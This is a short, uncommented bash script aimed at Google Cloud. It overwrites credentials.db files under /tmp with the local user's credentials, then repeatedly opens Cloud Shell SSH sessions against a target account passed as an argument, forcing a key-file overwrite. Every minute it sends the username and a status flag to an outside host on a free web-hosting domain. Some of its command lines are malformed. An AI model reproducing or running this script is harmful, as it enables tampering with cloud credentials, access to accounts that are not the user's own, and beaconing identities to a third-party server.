#!/bin/bash

target=$1

sudo rm -rf echo /tmp/tmp*/credentials.db | xargs -n 1

user=$(gcloud auth list --format="value(account)")

echo /tmp/tmp*/ | xargs -n 1 cp -v /home/${user/@*}/credentials.db

gcloud auth list 

while true
do
send=$(gcloud cloud-shell ssh --command="date >> ping ; echo 'T'" --authorize-session --force-key-file-overwrite --account=$target)

if [ $send != 'T' ]
then
   send='F'
fi

curl https://g11977765505.000webhostapp.com/ping.php?user=${user/@*}'&send='$send
sleep 60
done
